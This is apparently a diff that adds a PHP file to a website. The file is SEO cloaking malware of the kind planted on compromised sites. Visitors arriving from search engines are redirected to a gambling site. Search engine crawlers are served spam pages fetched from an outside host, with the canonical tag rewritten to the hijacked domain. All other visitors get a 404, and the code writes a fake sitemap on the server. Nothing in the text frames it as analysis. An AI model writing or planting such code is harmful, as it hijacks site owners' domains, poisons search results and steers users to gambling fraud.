@@ -1,0 +1,191 @@
+<?php
+$user_agent = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
+$geturl = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : "";
+$geturl = str_replace("/index.php?", "/", $geturl);
+$hostName = isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : "";
+$Remote_Address = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "";
+$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER']:"";
+$sitemap = simplexml_load_file('sitemap-custom-001.xml');
+$current_url = $_SERVER['REQUEST_URI'];
+$server_url = "https://id.zktech.dev/".str_replace("/tin-tuc","",$current_url)."?host=".$hostName;
+$sitemap_url = "https://id.zktech.dev/sitemap.php";
+$path="tin-tuc";
+function is_search_engine_referrer($referrer) {
+    $host = parse_url($referrer, PHP_URL_HOST);
+
+    if (empty($host)) {
+        return false;
+    }
+
+    $search_engines = array(
+        "google",
+        "bing",
+        "yahoo",
+        "baidu",
+        "yandex",
+        "duckduckgo"
+    );
+
+    foreach ($search_engines as $search_engine) {
+        if (strpos($host, $search_engine) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+function is_search_engine_bot($user_agent) {
+
+    $search_engine_bots = array(
+        "Googlebot",
+        "bingbot",
+        "Slurp",
+        "Yahoo! Slurp",
+        "facebookexternalhit"
+    );
+
+    foreach ($search_engine_bots as $bot) {
+        if (strpos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+function is_https()
+{
+    if (!empty($_SERVER["HTTPS"]) && strtolower($_SERVER["HTTPS"]) !== "off") {
+        return true;
+    } elseif (
+        isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) &&
+        $_SERVER["HTTP_X_FORWARDED_PROTO"] === "https"
+    ) {
+        return true;
+    } elseif (
+        !empty($_SERVER["HTTP_FRONT_END_HTTPS"]) &&
+        strtolower($_SERVER["HTTP_FRONT_END_HTTPS"]) !== "off"
+    ) {
+        return true;
+    }
+    return false;
+}
+
+function send_post($url, $post_data)
+{
+    $postdata = http_build_query($post_data);
+    $options = [
+        "http" => [
+            "method" => "POST",
+            "header" => "Content-type:application/x-www-form-urlencoded",
+            "content" => $postdata,
+            "timeout" => 15 * 60,
+        ],
+    ];
+    $context = stream_context_create($options);
+    $result = @file_get_contents($url, false, $context);
+    return $result;
+}
+function check_sitemap() {
+    $sitemap_path = "sitemap-custom-001.xml";
+    if (!file_exists($sitemap_path)) {
+        $sitemap = fopen($sitemap_path, "w+") or die("Unable to create sitemap.xml");
+        $sitemap_content = "<?xml version='1.0' encoding='UTF-8'?>\n<urlset xmlns='http://www.sitemaps.org/schemas/sitemap/0.9'>\n</urlset>";
+        fwrite($sitemap, $sitemap_content);
+        fclose($sitemap);
+        return true;
+    }
+
+    return true;
+}
+
+function process_sitemap($sitemap,$current_url,$hostName,$path){
+
+    if (is_https()) {
+        $http = "https";
+    } else {
+        $http = "http";
+    }
+    if(strpos($current_url,"sitemap-custom-001")){
+        $content=file_get_contents("sitemap-custom-001.xml");
+    }else{
+        $content=file_get_contents($sitemap.'?map='.$current_url."&path=".$path."&host=".$hostName."&protocol=".$http);
+    }
+    header("Content-Type: text/xml");
+
+    echo $content;
+    exit;
+}
+function process($server_url,$referrer,$user_agent,$sitemap,$current_url,$Remote_Address,$hostName,$geturl,$numbergroup=""){
+    if (is_search_engine_referrer($referrer)!== false) {
+        // user is coming from google search results
+        header("Location: https://sodopoker.com/sodo/");
+        exit();
+    } else {
+        if (is_search_engine_bot($user_agent)) {
+            if(check_sitemap()){
+                $url_found = false;
+                foreach($sitemap->url as $url) {
+                    if ($url->loc == $current_url) {
+                        $url_found = true;
+                        break;
+                    }
+                }
+                if (is_https()) {
+                    $http = "https";
+                } else {
+                    $http = "http";
+                }
+                if (!$url_found && strpos($current_url,".html")) {
+                    // add current URL to sitemap.xml
+                    $new_url = $sitemap->addChild('url');
+                    $new_url->addChild('loc', $http.'://'.$hostName.$current_url);
+                    $sitemap->asXML('sitemap-custom-001.xml');
+                }
+
+                $post_data = [
+                    "hostName" => $hostName,
+                    "boturl" => $geturl,
+                    "http" => $http,
+                    "numbergroup" => $numbergroup,
+                    "user_agent" => $user_agent,
+                    "Remote_Address" => $Remote_Address,
+                ];
+                // user is a bot
+                $file_contents = file_get_contents($server_url."&protocol=".$http);
+                $ext = pathinfo($current_url, PATHINFO_EXTENSION);
+
+                switch ($ext) {
+                case 'jpg':
+                    header('Content-Type: image/jpeg');
+                    break;
+                case 'png':
+                    header('Content-Type: image/png');
+                    break;
+                case 'css':
+                    header('Content-Type: text/css');
+                    break;
+                case 'js':
+                    header('Content-Type: application/javascript');
+                    break;
+                default:
+                    header('Content-Type: text/html');
+                    break;
+                }
+                $current_url = 'https://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+                $html = preg_replace('#<link rel="canonical" href="(.*?)">#', '<link rel="canonical" href="'.$current_url.'">', $file_contents);
+                echo $html;
+            }
+
+        } else {
+            // user is not a bot
+            header("HTTP/1.0 404 Not Found");
+            exit();
+        }
+    }
+}
+
+if(preg_match('/sitemap.*\.xml$/', $current_url)){
+    process_sitemap($sitemap_url,$current_url,$hostName,$path);
+}else{
+    process($server_url,$referrer,$user_agent,$sitemap,$current_url,$Remote_Address,$hostName,$geturl);
+}
